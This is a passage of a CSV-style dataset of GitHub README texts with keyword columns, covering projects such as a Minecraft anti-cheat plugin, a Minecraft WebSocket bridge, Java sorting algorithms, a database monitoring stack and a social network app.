* Actuator URL: http://localhost:8080/actuator 
* Actuator URL for modulith: http://localhost:8080/actuator/modulith
* RabbitMQ Admin URL: http://localhost:15672 (Credentials: guest/guest)
* Zipkin URL: http://localhost:9411

## Deploying on k8s cluster
* [Install kubectl](https://kubernetes.io/docs/tasks/tools/)
* [Install kind](https://kind.sigs.k8s.io/docs/user/quick-start/)

```shell
$ brew install kubectl
$ brew install kind
```

Create KinD cluster and deploy app.

```shell
# Create KinD cluster
$ task kind_create

# deploy app to kind cluster 
$ task k8s_deploy

# undeploy app
$ task k8s_undeploy

# Destroy KinD cluster
$ task kind_destroy
```
",0,1,1,1.0,"['prerequisite', 'use', 'task', 'perform', 'various', 'task', 'run', 'test', 'automatically', 'format', 'code', 'use', 'build', 'docker', 'image', 'run', 'application', 'docker', 'container', 'deploy', 'cluster', 'create', 'kind', 'cluster', 'deploy', 'app', 'kind', 'cluster', 'undeploy', 'app', 'destroy', 'kind', 'cluster']","['cluster', 'kind', 'use', 'task', 'run']"
Bram1903/TotemGuard,main,"<div align=""center"">
  <h1>TotemGuard</h1>
  <img alt=""Build"" src=""https://github.com/Bram1903/TotemGuard/actions/workflows/gradle.yml/badge.svg"">
  <img alt=""CodeQL"" src=""https://github.com/Bram1903/TotemGuard/actions/workflows/codeql.yml/badge.svg"">
  <img alt=""GitHub Release"" src=""https://img.shields.io/github/release/Bram1903/TotemGuard.svg"">
  <br>
  <a href=""https://www.spigotmc.org/resources/totemguard.119385/""><img alt=""SpigotMC"" src=""https://img.shields.io/badge/-SpigotMC-blue?style=for-the-badge&logo=SpigotMC""></a>
  <a href=""https://modrinth.com/plugin/totemguard""><img alt=""TotemGuard"" src=""https://img.shields.io/badge/-Modrinth-green?style=for-the-badge&logo=Modrinth""></a>
  <br>
  <a href=""https://discord.deathmotion.com""><img alt=""Discord"" src=""https://img.shields.io/badge/-Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white""></a>
</div>

## Overview

TotemGuard is a lightweight anti-cheat plugin designed to detect players using AutoTotem. It operates asynchronously to minimize server impact and offers extensive configurability, enabling server owners to tailor the plugin to their specific needs.

### Prerequisites

TotemGuard requires the [PacketEvents](https://modrinth.com/plugin/packetevents) library to function. Ensure it is installed on your server.

## Table of Contents

- [Overview](#overview)
    - [Prerequisites](#prerequisites)
- [Showcase](#showcase)
- [Supported Platforms & Versions](#supported-platforms--versions)
- [Checks](#checks)
- [Features](#features)
- [Commands](#commands)
- [Permission Nodes](#permission-nodes)
- [Installation](#installation)
- [Compiling From Source](#compiling-from-source)
    - [Prerequisites](#prerequisites)
    - [Steps](#steps)
- [Credits](#credits)
- [License](#license)

## Showcase

![Demo](docs/showcase/showcase.png)

## Supported Platforms & Versions

| Platform                        | Supported Versions |
|---------------------------------|--------------------|
| Paper, Folia, and related forks | 1.18 - 1.21.1      |

## Checks

### AutoTotem

- **AutoTotemA** - Click time difference
- **AutoTotemB** - Impossible standard deviation
- **AutoTotemC** - Impossible consistency difference
- **AutoTotemD** - Suspicious re-totem packet sequence
- **AutoTotemE** - Impossible low outliers
- **AutoTotemF** - Invalid interactions during inventory close

### BadPackets

- **BadPacketsA** - Opt-out message in a mod configuration channel
- **BadPacketsB** - Banned client brand

### ManualTotem

- **ManualTotemA** - Time difference between replacement after totem removal

## Features

- **Performance** - Asynchronous operations ensure minimal impact on server performance.
- **Database Support** - Compatible with both MySQL and SQLite.
- **Folia Integration** - Supports [Folia](https://papermc.io/software/folia) for regionized multithreading.
- **Webhooks** - Send alerts and punishments to a Discord webhook.
- **Highly Configurable** - Adjust nearly every setting during runtime to fit your server's needs.
- **Update Checker** - Automatically checks for updates on startup.
- **Bypass Permission** - Allows players with `TotemGuard.Bypass` to bypass checks.
- **Bedrock Exception** - Automatically ignores Bedrock Edition players to prevent false positives.
- **BetterReload Support** - Integrates with [BetterReload](https://modrinth.com/plugin/betterreload) for seamless configuration reloading.

## Commands

- `/totemguard` or `/tg` - Main command for TotemGuard.
- `/totemguard reload` - Reload the plugin configuration.
- `/totemguard alerts` - Toggle alerts for the player.
- `/totemguard alerts <player>` - Toggle alerts for another player.
- `/totemguard profile` - Display the player's profile.
- `/totemguard stats` - Show plugin statistics.
- `/totemguard clearlogs` - Clear the logs.
- `/totemguard database trim` - Trim the database.
- `/totemguard database clear` - Clear the database.
- `/totemcheck <player>` - Check the player for AutoTotem.

## Permission Nodes

Operators (OPs) have these permissions by default, except `TotemGuard.Debug`:

- `TotemGuard.*` - Access to all TotemGuard permissions.
- `TotemGuard.Staff` - Access to `TotemGuard.Check`, `TotemGuard.Alerts`, and `TotemGuard.Profile`.
- `TotemGuard.Databases.*` - Access to all database-related commands.
- `TotemGuard.Reload` - Access to the `/totemguard reload` command.
- `TotemGuard.Check` - Access to the `/totemcheck` command.
- `TotemGuard.Alerts` - Access to the `/totemguard alerts` command.
- `TotemGuard.Alerts.Others` - Toggle alerts for other players.
- `TotemGuard.Profile` - Access to the `/totemguard profile` command.
- `TotemGuard.Stats` - Access to the `/totemguard stats` command.
- `TotemGuard.ClearLogs` - Access to the `/totemguard clearlogs` command.
- `TotemGuard.Bypass` - Bypass the plugin's checks.
- `TotemGuard.Update` - Receive update notifications.
- `TotemGuard.Database.Trim` - Access to the `/totemguard database trim` command.
- `TotemGuard.Database.Clear` - Access to the `/totemguard database clear` command.
- `TotemGuard.Debug` - View debug messages.

## Installation

1. **Prerequisites**: Ensure [PacketEvents](https://modrinth.com/plugin/packetevents) is installed.
2. **Download**: Get the latest release from the [GitHub release page](https://github.com/Bram1903/TotemGuard/releases/latest).
3. **Install**: Place the plugin JAR file in your server's `plugins` directory.
4. **Configure**: Customize the `config.yml` file as needed.
5. **Reload**: Apply the changes using `/totemguard reload`.

## Compiling From Source

### Prerequisites

- Java Development Kit (JDK) 21 or higher
- [Git](https://git-scm.com/downloads)

### Steps

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/Bram1903/TotemGuard.git
   ```
2. **Navigate to the Project Directory**:
   ```bash
   cd TotemGuard
   ```
3. **Compile the Source Code**:
   Use the Gradle wrapper to build the plugin:

   <details>
   <summary><strong>Linux / macOS</strong></summary>

   ```bash
   ./gradlew build
   ```
   </details>
   <details>
   <summary><strong>Windows</strong></summary>

   ```cmd
   .\gradlew build
   ```
   </details>

## Credits

Special thanks to:

- **[@Retrooper](https://github.com/retrooper)**: Author of [PacketEvents](https://github.com/retrooper/packetevents).

## License

This project is licensed under the [GPL3 License](LICENSE).",3,0,1,2.0,"['overview', 'prerequisite', 'table', 'content', 'showcase', 'support', 'platform', 'version', 'check', 'autototem', 'badpackets', 'manualtotem', 'feature', 'command', 'permission', 'node', 'installation', 'compile', 'from', 'source', 'prerequisite', 'step', 'credit', 'license']","['prerequisite', 'overview', 'table', 'content', 'showcase']"
17TheWord/QueQiao,main,"<div align=""right"">
🌍<a href=""https://github.com/17TheWord/QueQiao/blob/main/README_EN.md"">English</a> / 中文
</div>

<p align=""center"">
  <img src=""https://raw.githubusercontent.com/17TheWord/nonebot-adapter-minecraft/main/assets/logo.png"" width=""200"" height=""200"" alt=""ChatImage"">
</p>

<div align=""center"">

# 鹊桥

✨ 连接 Minecraft 服务器的桥梁 ✨

</div>

<p align=""center"">
  <a href=""https://github.com/17TheWord/QueQiao/blob/main/LICENSE"">
    <img src=""https://img.shields.io/badge/license-MIT-green"" alt=""license"">
  </a>
  <a href=""https://www.spigotmc.org"">
    <img src=""https://img.shields.io/badge/SpigotMC-1.12.2--latest-blue?logo=SpigotMC"" alt=""spigotmc""/>
  </a>
  <a href=""https://files.minecraftforge.net"">
    <img src=""https://img.shields.io/badge/Forge-1.16.5--1.21-blue?logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAA7VBMVEUdLUEcLEAbKz8aKj4sO04zQlQzQVM0QlQ2RFY2RVYlNEgqOUx0fouPl6GNlZ+Fjpl/iJO7wMbe4ePU19vLz9TEyM6dpK2Gjpk9S1weLkJZZXPS1dn////4+fni5Ofv8fL+/v7o6euDjJc1Q1UfL0MeLUEaKj+WnafX2t7j5ef19fb39/hyfIgbLEAbK0AvPlA3RVd3gY35+frX2t0rOk0nNkp8hZH4+Pnp6+1kb30oN0q3vMPg4uX3+Pjl5+nY296zub8+TF3JzdKTm6ReaXhTX25daXeLk57Hy9A8SlsgMEMrOkwkM0cjMkYgL0P3AqTmAAAAAWJLR0QcnARBBwAAAAd0SU1FB+AJFRIdHqqGUp8AAACMSURBVBjTY2AgFzBCAYjNxMzMzMjCysbKys7BycXAwM3Dy8cvICgkLCIqKCYuwcQgKSUtIysnLyOjoKikrKIK1KLGqa6hqSUjo62jqwcxUI9B38DQSMbYhAluB5OpmbmMhaUVI8xOFmsbOVs7ewcTqAiTo5Ozi6ubu4cnTJOXtw/QMb7cfgiHIpEEAQAlIg2L5ZmkuQAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxNi0wOS0yMVQxODoyOTozMCswMjowMOts9rwAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTYtMDktMjFUMTg6Mjk6MzArMDI6MDCaMU4AAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAFd6VFh0UmF3IHByb2ZpbGUgdHlwZSBpcHRjAAB4nOPyDAhxVigoyk/LzEnlUgADIwsuYwsTIxNLkxQDEyBEgDTDZAMjs1Qgy9jUyMTMxBzEB8uASKBKLgDqFxF08kI1lQAAAABJRU5ErkJggg=="" alt=""forge"">
  </a>
  <a href=""https://fabricmc.net"">
    <img src=""https://img.shields.io/badge/Fabric-1.16.5--1.21-blue?logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAASCAYAAACEnoQPAAAAAXNSR0IArs4c6QAAAgVJREFUOE9jZCAALEy0/p84c40RmzKsgjCFII2L53QxxKaUMTD//St99PzNZ8iGENQ8d1obw4SpCxjuP3oc/fXT18vHz964DDOAoOa+jmoGURF+hrySFoZ3Hz4vOnnmajxBzchObqkrYpCRFmM4fuo8w8y5KxlgYYBhs7WhutRfZuanMBtBtoD8XF6YxiAhIcogIswP5oMMQNFsaaJZyi/A75WWGOagrqrE8P37TwZ+fm6Gy1dvMWzfdZhBTkaSwcnekqG4qp3hPyPDThTN5ibaC4UEeOMm9dSAvfX6zUewf0EA5Gd5ORmGkAAPhpqmPrAYXDPIj+nJ4Qw2lsYoUQoyAAS+f//BcP7iVYY1G3YweLg5M+zYtReiGRY4IPa/f/8Y3r77DLcRJPbw0QuwARcuXQNrBgGwn0Eay4qyGHS1FLDaCHI2SHNn/yyGT5+/okYVSHNBTgqDuoosAzsHGwMrCzPYkI8fvzJ8/wEJsKPHzzOs27jzwJcvX7YdP3O9Gx7PIM1JcSEMIiJiDDLSIgyC/DxwF8CcCwognMkTZgAvLx8DDzc3g4aaLNgAkGaQRoIZA2SAnbUpg5qqIoOQkAgDHw8HXo0oUWVppO0uJilSwsPN6eLiZMOwb/8xhtt3H+C0FUUziANKJNxc7HERIT4M8xatgUcJSjQgcXCmbVhc4tIIEgcAl83Xiz8XILwAAAAASUVORK5CYII="" alt=""fabric"">
  </a>
  <a href=""https://papermc.io/software/velocity"">
    <img src=""https://img.shields.io/badge/Velocity-3.3.0-blue?logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAACA0lEQVRoBe2avUoEMRSF8yaCnWAvaGFjYWkjFhY2NlYWgoVgY2VnY+cjCFY+wGKzyiqIIGKt7LpvIDaRb+Asl1HZTIbZmUgCl5vJJpPzc2dYyLjPL+9t3A6e/OHxqV9d3/Tzi8t+bmGp1QADWMAENouVvrMDTGob8LT9wWgxTwhs7+53HrzIgVUkCgIpKC/wynLCUVcaTC2D3aWovoQGu+MJ10BqGeyuC6/KWOHA7mIXd2VdJtC2E9mB7EDNP4u5hHIJ5RKqqQAltLK24c/OL4qgP8uyin6ID45OfP/uwau9vQ/95dW1JydBQMCVIUTQejf9gghkQiOWdJQDKG0bTgAAsGrWHY1RZls7ez+iTtlVJsBmtgEaUICzbTQa++eXVztUEIS8gjUQZ/3MHEBZQptr47IrIB9+jAsC/KYSsxngCDJTBwQeAvRxgD4gbAkN7h8n6ts1zP0rICdBQnPtEhJKQKGomtTXtc0QVRnZzD1CgWteZQIsZKNyAxQKkq365Xlcs96WksDE5CgClAtl8VuDAL+FBg7EANeaKAIsFgkAoyhR520iQFVzNIGqGzU1PxNoStnQ+2YHQpVqal52oCllQ++bHQhVqql52YGmlA29b/oHHMkfMSV/yJf8MSsn3im6AGaw/49PDfTdQQpOSHlhnjigAZ4JJvF26sIZ8rTPbb4BrNNEDGiTm7EAAAAASUVORK5CYII="" alt=""velocity"">
  </a>
  <a href=""https://github.com/17TheWord/QueQiao/releases"">
    <img  src=""https://img.shields.io/github/v/release/17TheWord/QueQiao"" alt=""release"">
  </a>
</p>

<p align=""center"">
  <a href=""https://github.com/17TheWord/QueQiao/wiki"">📖Docs</a>
  ·
  <a href=""https://modrinth.com/plugin/queqiao"">⬇️Modrinth</a>
  ·
  <a href=""https://www.curseforge.com/minecraft/mc-mods/queqiao"">⬇️CurseForge</a>
  ·
  <a href=""https://github.com/17TheWord/QueQiao/issues"">🐛Submit Suggestion/Bug</a>
</p>

## 介绍

- 将 `Minecraft` 服务端**玩家事件**以 `Json` 格式通过 `Websocket` 分发的服务端 `plugin/mod`。
    - 已实现的 [`事件`](https://github.com/17TheWord/QueQiao/wiki/4.-%E5%9F%BA%E6%9C%AC%E4%BA%8B%E4%BB%B6%E7%B1%BB%E5%9E%8B)
        - [`玩家聊天`](https://github.com/17TheWord/QueQiao/wiki/4.-%E5%9F%BA%E6%9C%AC%E4%BA%8B%E4%BB%B6%E7%B1%BB%E5%9E%8B)
        - [`玩家命令`](https://github.com/17TheWord/QueQiao/wiki/4.-%E5%9F%BA%E6%9C%AC%E4%BA%8B%E4%BB%B6%E7%B1%BB%E5%9E%8B)
        - [`玩家死亡`](https://github.com/17TheWord/QueQiao/wiki/4.-%E5%9F%BA%E6%9C%AC%E4%BA%8B%E4%BB%B6%E7%B1%BB%E5%9E%8B) (`Velocity`
          暂无)
        - [`玩家加入`](https://github.com/17TheWord/QueQiao/wiki/4.-%E5%9F%BA%E6%9C%AC%E4%BA%8B%E4%BB%B6%E7%B1%BB%E5%9E%8B)
        - [`玩家登出`](https://github.com/17TheWord/QueQiao/wiki/4.-%E5%9F%BA%E6%9C%AC%E4%BA%8B%E4%BB%B6%E7%B1%BB%E5%9E%8B)
- 通过 `Websocket` 接收 `Json` 消息，并转发至游戏玩家。
    - 已实现的接口
        - [`Broadcast`](https://github.com/17TheWord/QueQiao/wiki/5.-API#broadcast--send-message)
        - [`PrivateMessage`](https://github.com/17TheWord/QueQiao/wiki/5.-API#privatemessage)
        - [`Title & SubTitle`](https://github.com/17TheWord/QueQiao/wiki/5.-API#title)
        - [`ActionBar`](https://github.com/17TheWord/QueQiao/wiki/5.-API#actionbar)

## 快速开始

1. 安装服务端对应的 `插件/Mod`
2. 配置 `config.yml` 中的 `websocket_server`
    - `enable: true` # 是否启用
    - `host: ""127.0.0.1""`     # WebSocket Server 地址
    - `port: 8080` # WebSocket Server 端口
3. 启动服务器，等待开启 `Websocket Server`
4. 使用 [`ApiFox`](https://apifox.com/) 或其他API测试工具，或连接 [对接](#对接) 项目
    - 配置全局 `Request Header`
      ```json5
      {
        ""x-self-name"": ""TestServer"",
        // 必填
        // 服务器名称，必须与 config.yml 中的 'server_name' 一致
        ""Authorization"": ""Bearer 123"",
        // 选填
        // 鉴权，必须与 config.yml 中的 'access_token' 一致,如果 config.yml 中的 'auth_token' 为空，则可不设置此项
        ""x-client-origin"": ""apifox""
        // 必填
        // 客户端来源，如果来源为 'minecraft'，则表示来自 Minecraft 的 Websocket Client，且会被 Minecraft 端的 Websocket Server 拒绝
      }
      ```
5. 开始游戏，加入服务器

## 帮助与下载

- 前往 [`Wiki`](https://github.com/17TheWord/QueQiao/wiki) 查看文档
- 前往 [`Modrinth`](https://modrinth.com/plugin/queqiao/versions) 下载
- 前往 [`CurseForge`](https://www.curseforge.com/minecraft/mc-mods/queqiao) 下载

## 对接

- [`@17TheWord/nonebot-adapter-minecraft`](https://github.com/17TheWord/nonebot-adapter-minecraft)：`NoneBot2` 适配器，与本模组连接
- [`@17TheWord/nonebot-plugin-mcqq`](https://github.com/17TheWord/nonebot-plugin-mcqq)：`NoneBot2` 插件，与 `Minecraft`
  互通聊天
- [`@CikeyQi/mc-plugin`](https://github.com/CikeyQi/mc-plugin)：云崽插件，与 `Minecraft` 互通聊天

## 兼容

- [`@kitUIN/ChatImage`](https://github.com/kitUIN/ChatImage)：在 `Minecraft` 聊天栏中显示图片

## 特别感谢

- [`@kitUIN`](https://github.com/kitUIN)：提供代码上的帮助以及构建工具
- [`@kitUIN/ModMultiVersion`](https://github.com/kitUIN/ModMultiVersion)：`IDEA` 多版本 `MOD` 插件
- [`@kitUIN/ModMultiVersionTool`](https://github.com/kitUIN/ModMultiVersionTool)：多版本 `MOD` 构建工具

## 贡献与支持

- 觉得好用可以给这个项目点个 `Star` 或者去 [`爱发电`](https://afdian.com/a/17TheWord) 投喂我。

- 有意见或者建议也欢迎提交 [`Issues`](https://github.com/17TheWord/QueQiao/issues)
  和 [`Pull requests`](https://github.com/17TheWord/QueQiao/pulls) 。

## 开源许可

本项目使用 [`MIT`](https://github.com/17TheWord/QueQiao/blob/main/LICENSE) 作为开源许可证。
",5,3,2,11.0,"['websocket', 'server', 'websocket', 'server']","['websocket', 'server']"
Zalaya/sorting-algorithms,main,"# Sorting Algorithms in Java

This project is a collection of classic sorting algorithms implemented in Java, aimed at providing an educational resource for understanding the importance and mechanics of sorting in computer science.

## Table of Contents

- [Introduction](#introduction)
- [Algorithms Included](#algorithms-included)
- [Project Structure](#project-structure)
- [Testing](#testing)
- [Contributing](#contributing)
- [License](#license)

## Introduction

Sorting algorithms are a key concept in computer science due to their role in optimizing the performance of other algorithms, which require sorted data for efficient operation. Understanding different sorting algorithms helps in selecting the right algorithm for a given problem based on its time complexity and use case.

This project showcases different sorting techniques with clear and concise Java implementations. It is a great starting point for learners who want to dive deeper into algorithm design and analysis.

## Algorithms Included

- **Bubble Sort:** A basic comparison-based sorting algorithm that repeatedly steps through the list, compares adjacent elements, and swaps them if they are in the wrong order.
- **Selection Sort:** An algorithm that divides the input list into two parts: the sorted part at the beginning and the unsorted part at the end, and repeatedly selects the smallest (Or largest) element from the unsorted part.
- **Insertion Sort:** A simple sorting algorithm that builds the final sorted array one item at a time, inserting each element into its correct position.
- **Merge Sort:** A divide-and-conquer algorithm that divides the input array into two halves, recursively sorts the two halves, and then merges the sorted halves.
- **Quick Sort:** A divide-and-conquer algorithm that selects a ""pivot"" element and partitions the array around the pivot, then recursively sorts the subarrays.
- **Heap Sort:** A comparison-based sorting algorithm that uses a binary heap data structure to sort elements in place.

More algorithms will be added over time to expand this educational resource.

## Project Structure

The project is organized into several key directories:

- `src/main/java/xyz/zalaya/sorting/algorithms`: Contains the core implementations of the sorting algorithms.
- `src/test/java/xyz/zalaya/sorting/algorithms`: Contains unit tests to validate the correctness of the algorithms.
- `.editorconfig`: Provides configuration for consistent code style across different IDEs and text editors.

The project is designed to be modular and easy to navigate, with all implementations and tests neatly organized for clarity and learning purposes.

## Testing

Testing is a critical part of understanding and validating algorithms. This project includes unit tests in the `src/test/java/xyz/zalaya/sorting/algorithms/implementations` directory to verify the correctness and performance of the sorting algorithms.

To run the tests, simply execute:

```bash
mvn test
```

This will ensure that all algorithms behave as expected under various conditions.

## Contributing

Contributions are welcome! Whether you want to add new sorting algorithms, optimize existing ones, or improve the documentation, your input is valuable.

For more information on how to contribute, please check the [CONTRIBUTING.md](CONTRIBUTING.md) file.

## License

This project is licensed under the [GNU General Public License v3.0](LICENSE). For more details, please refer to the [LICENSE.md](LICENSE) file.
",0,1,1,7.0,"['sort', 'algorithm', 'java', 'table', 'content', 'introduction', 'algorithm', 'include', 'project', 'structure', 'test', 'contribute', 'license']","['algorithm', 'sort', 'java', 'table', 'content']"
Anyel-ec/SecurityMonitoring,main,"# Dynamic Database Monitoring: MongoDB, MariaDB/MySQL, PostgreSQL using React and Spring Boot

This project aims to develop an open-source tool for dynamic monitoring of three databases: **MongoDB**, **PostgreSQL**, and **MariaDB/MySQL**. The tool allows users to specify connection credentials through a web interface in **React**, and subsequently visualize customized dashboards in **Grafana** for one or several databases in a combined manner.

The backend is built with **Spring Boot** and uses **Prometheus** and **Grafana** to collect and visualize the selected database metrics.

## Project Status

This project is under development. The following has been implemented so far:
- A **React** interface for entering database connection credentials.
- **Docker Compose** integration with services for Grafana, Prometheus, and exporters for **PostgreSQL**, **MongoDB**, and **MariaDB** databases.
- Initial monitoring and visualization configuration in **Grafana**.

## Technologies Used

- **Frontend**: React (created with Vite), React Bootstrap for designing dynamic forms.
- **Backend**: Spring Boot (under development).
- **Monitoring and Visualization**: Grafana and Prometheus.
- **Databases**: MongoDB, PostgreSQL, and MariaDB.
- **Containers**: Docker and Docker Compose for service orchestration.

## Features

1. **Database Connection Configuration**:
    - Users can specify credentials to connect to **MongoDB**, **PostgreSQL**, and **MariaDB** via a dynamic form in the React app.
    - It allows the combination of different databases: for example, monitoring only **MongoDB**, **PostgreSQL**, or **MariaDB**, or combinations like **MongoDB+PostgreSQL**.

2. **Dynamic Monitoring**:
    - The backend in **Spring Boot** (upcoming development) will receive the credentials provided by the user and configure the connections to the databases.
    - Metrics are collected using **Prometheus** and visualized through **Grafana**.

3. **Visualization in Grafana**:
    - Preconfigured dashboards in **Grafana** that are activated based on the databases selected by the user.

## Project Structure

```
.
├── frontend/                    # React Application
│   ├── src/
│   │   ├── components/          # React Components (includes SwitchToggle, Forms, etc.)
│   │   └── App.js               # React entry point
│   └── public/                  # Static files
├── backend/                     # Upcoming: Spring Boot Backend
├── .devcontainer/               # Development container configurations
└── README.md                    # Project documentation
```

## Prerequisites

- **Docker** and **Docker Compose** installed.
- **Node.js** and **npm** installed for the React frontend.

## Installation and Usage

### 1. Clone the Repository

```bash
git clone https://github.com/Anyel-ec/SecurityMonitoring
cd SecurityMonitoring
```

### 2. Run the Frontend

```bash
cd frontend
npm install
npm run dev
```

### 3. Run the Services with Docker Compose

```bash
docker-compose up -d
```

This will launch the following services:
- **Grafana**: Accessible at `http://localhost:3000` (user: `admin`, password: `admin`).
- **Prometheus**: Accessible at `http://localhost:9090`.
- **PostgreSQL Exporter**: Accessible at `http://localhost:9187`.
- **MongoDB Exporter**: Accessible at `http://localhost:9216`.
- **MariaDB Exporter**: Accessible at `http://localhost:9104`.

### 4. Configure Grafana

1. Access **Grafana** at `http://localhost:3000`.
2. Log in using the credentials (`admin/admin`).
3. Add **Prometheus** as a data source:
   - URL: `http://prometheus:9090`.
4. Import the relevant dashboard to visualize the metrics for the configured databases.

### 5. Next Steps

The next step in development is to integrate the **Spring Boot** backend to handle dynamic database connections and automatically configure Prometheus exporters based on the credentials provided.

## Docker Compose Configuration (`docker-compose.yml`)

The `docker-compose.yml` file is configured to start the necessary services for monitoring the databases and visualizing them in Grafana. Below is the current configuration:

```yaml
version: '3'

services:
  grafana:
    image: grafana/grafana
    ports:
      - ""3000:3000""
    environment:
      GF_SECURITY_ADMIN_USER: admin
      GF_SECURITY_ADMIN_PASSWORD: admin
    volumes:
      - grafana_storage:/var/lib/grafana
    
  prometheus:
    image: prom/prometheus
    ports:
      - ""9090:9090""
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml:ro 
    
  # MongoDB Service
  mongo_db:
    image: mongo:latest
    ports:
      - ""27020:27017""
    volumes:
      - mongo_data:/data/db
  
  # MariaDB Service
  mariadb_db:
    image: mariadb:latest
    restart: always
    environment:
      MYSQL_DATABASE: ${MYSQL_DATABASE}
      MYSQL_USER: ${MYSQL_USER}
      MYSQL_PASSWORD: ${MYSQL_PASSWORD}
      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}
    ports:
      - ""3306:3306""
    expose:
      - ""3306""

  # PostgreSQL Service
  postgresql_db:
    image: postgres:latest
    volumes:
      - postgres_data:/var/lib/postgresql/data
    environment:
      POSTGRES_DB: ${POSTGRES_DB}
      POSTGRES_USER: ${POSTGRES_USER}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
    ports:
      - ""5433:5432""
  
  ##############################################
  # Exporter Services
  mongo-exporter:
    image: ssheehy/mongodb-exporter:latest
    ports:
      - ""9216:9216""
    environment:
      MONGODB_URI: ""mongodb://mongo_db:27017""
    depends_on:
      - mongo_db
  
  postgres-exporter:
    image: prometheuscommunity/postgres-exporter
    ports:
      - ""9187:9187""
    environment:
      DATA_SOURCE_NAME: ""postgresql://postgres:${POSTGRES_PASSWORD}@postgresql_db:5432/${POSTGRES_DB}?sslmode=disable""
    depends_on:
      - postgresql_db

  mariadb-exporter:
    image: prom/mysqld-exporter
    depends_on:
      - mariadb_db
    command:
      - --config.my-cnf=/cfg/.my.cnf
      - --mysqld.address=192.168.0.215:3306
    volumes:
      - ""./.my.cnf:/cfg/.my.cnf""
    ports:
      - ""9104:9104""
  
volumes:
  grafana_storage:
  postgres_data:
  mongo_data:
```

## Prometheus Configuration (`prometheus.yml`)

The `prometheus.yml` file is configured to monitor services for MongoDB, PostgreSQL, and MariaDB through their respective exporters.

```yaml
global:
  scrape_interval: 5s

scrape_configs:
  - job_name: 'prometheus'
    static_configs:
      - targets: ['prometheus:9090']

  - job_name: 'postgres'
    static_configs:
      - targets: ['postgres-exporter:9187']

  - job_name: 'mongo'
    static_configs:
      - targets: ['mongo-exporter:9216']

  - job_name: 'mariadb'
    static_configs:
      - targets: ['192.168.0.215:9104']
```

## Contribution

This project is open-source, and any contributions are welcome. If you'd like to collaborate, follow these steps:

1. Fork the repository.
2. Create a new branch for your feature (`git checkout -b feature/new-feature`).
3. Commit your changes (`git commit -m 'Add new feature'`).
4. Push your branch (`git push origin feature/new-feature`).
5. Open a **Pull Request** for review.

## Project Status

This project is still under development, and some of the functionalities described are under construction.

Upcoming features include:
- Full integration with **Spring Boot**.
- Enhanced configuration and customization of **Grafana** dashboards for each database.
- Support for more databases and monitoring systems.
",0,0,2,0.0,"['dynamic', 'database', 'monitoring', 'mongodb', 'postgresql', 'use', 'react', 'spring', 'boot', 'project', 'status', 'technology', 'use', 'feature', 'project', 'structure', 'react', 'application', 'react', 'component', 'include', 'switchtoggle', 'form', 'etc', 'react', 'entry', 'point', 'static', 'file', 'upcoming', 'spring', 'boot', 'backend', 'development', 'container', 'configuration', 'project', 'documentation', 'prerequisite', 'installation', 'usage', 'clone', 'repository', 'run', 'frontend', 'run', 'service', 'docker', 'compose', 'configure', 'grafana', 'next', 'step', 'docker', 'compose', 'configuration', 'mongodb', 'service', 'mariadb', 'service', 'postgresql', 'service', 'exporter', 'service', 'prometheus', 'configuration', 'contribution', 'project', 'status']","['service', 'react', 'project', 'configuration', 'mongodb']"
ngud-119/Social-Network,master,"# Social-Network

Social-Network is a Stateful app built with [Spring Boot](http://spring.io/projects/spring-boot), [MySQL](https://www.mysql.com/) and [React](https://reactjs.org/).

Features:
- Routing
- User authentication: Register/Login/Logout
- 3 User Roles: Root, Admin and User
- Promoting/Demoting users to Admin/User
- Creating and deleting users
- Editing user profile
- Searching for friends
- Sending and accepting friend requests
- Removing friends from the friends list
- Adding and deleting photos
- Creating and deleting posts
- Creating and deleting comments
- Chat functionality: writing and receiving messages from your friends
- Logs history

The project is deployed on [Heroku](https://social-network-kl.herokuapp.com/).

**Admin Credentials:**
- username: john
- password: 1111

## Requirements

1. Java 11

2. In order to be able to save `Photos` you need to sign up to [Cloudinary](https://cloudinary.com/) and enter your credentials in the `application.properties` file of the Spring Boot app (`SocialNetwork\Server\src\main\resources\application.properties`)

## Start the app

### **Option 1 - Start the Client and the Server manually**

#### 1. Start the Client

To start the Client you need to enter the `SocialNetwork/Client` folder:

```bash
$ cd SocialNetwork/Client
```

Install all dependencies:

```bash
$ npm install
```

Run the app in the development mode:

```bash
$ npm start
```

Open [http://localhost:3000](http://localhost:3000) to view it in the browser.

#### 2. Start the Server

Go to the root directory of the Spring Boot app:

```bash
$ cd SocialNetwork/Server
```

Start the Server:

```bash
$ mvn spring-boot:run
```
The Server is running on port `8000`.


### **Option 2 - Start the application in Docker**

1. **Start the application**

Go to the project directory( `SocialNetwork/` ) and run:

```bash
$ docker-compose up -d
```

The front-end server will start on port `9090`. To open it enter in your browser:

```bash
$ http://localhost:9090
```
2. **Stop the application**

You can stop the containers with:

 ```bash 
 $ docker-compose down
 ```

## App screenshots

1. **Home Page**

 ![App Screenshot](readme-images/kl-social-network-home-gregor.PNG)

2. **Friends Page**

 ![App Screenshot](readme-images/kl-social-network-friends-gregor.PNG)

3. **Photos Page**

 ![App Screenshot](readme-images/kl-social-network-photos-gregor.PNG)
",0,0,1,0.0,"['requirement', 'start', 'app', 'option', 'start', 'client', 'server', 'manually', 'start', 'client', 'start', 'server', 'option', 'start', 'application', 'docker', 'app', 'screenshots']","['start', 'app', 'option', 'client', 'server']"
Hindhuja-V/bluetooth-home-automation,main,"# Bluetooth-Home-Automation

### Description
A solution to control home appliances using a Bluetooth device (an Android smartphone).

This repository consists of source code for an Android app as well as Arduino configuration.

### Requirements
Before you begin, ensure you have the following:

1. Arduino development board
2. HC-05 or HC-06 Bluetooth module
3. 5V DC / 220V AC relays
4. Android Bluetooth device
5. Connecting wires.

### Steps to set up Arduino
